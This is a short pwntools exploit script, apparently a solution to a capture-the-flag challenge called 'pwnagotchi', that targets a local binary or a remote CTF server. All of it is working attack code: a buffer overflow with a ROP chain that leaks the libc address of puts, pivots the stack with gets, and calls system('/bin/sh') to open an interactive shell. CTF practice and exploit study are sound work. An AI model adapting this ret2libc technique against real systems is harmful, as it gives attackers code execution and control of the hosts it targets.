from pwn import *

e = ELF("./pwnagotchi")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("pwn.hsctf.com", 5005)
else:
  p = process(e.path)
  # {"LD_PRELOAD": libc.path})

rdi = 0x4009f3
stk = 0x601f00

p.sendlineafter(":", "A" * (0x14 - 8) + p64(stk) + p64(rdi) + p64(e.got["puts"]) + p64(e.symbols["puts"]) + p64(rdi) + p64(stk + 8) + p64(e.symbols["gets"]) + p64(0x400987))

p.recvuntil("is not happy")
p.recvline()

leak = u64(p.recvline(keepends=False).ljust(8, "\x00")) - libc.symbols["puts"]
print(hex(leak))

p.sendline(p64(rdi) + p64(stk + 8 + 3 * 8) + p64(e.symbols["gets"]))
debug()

p.sendline(p64(rdi) + p64(next(libc.search("/bin/sh")) + leak) + p64(libc.symbols["system"] + leak))



p.interactive()
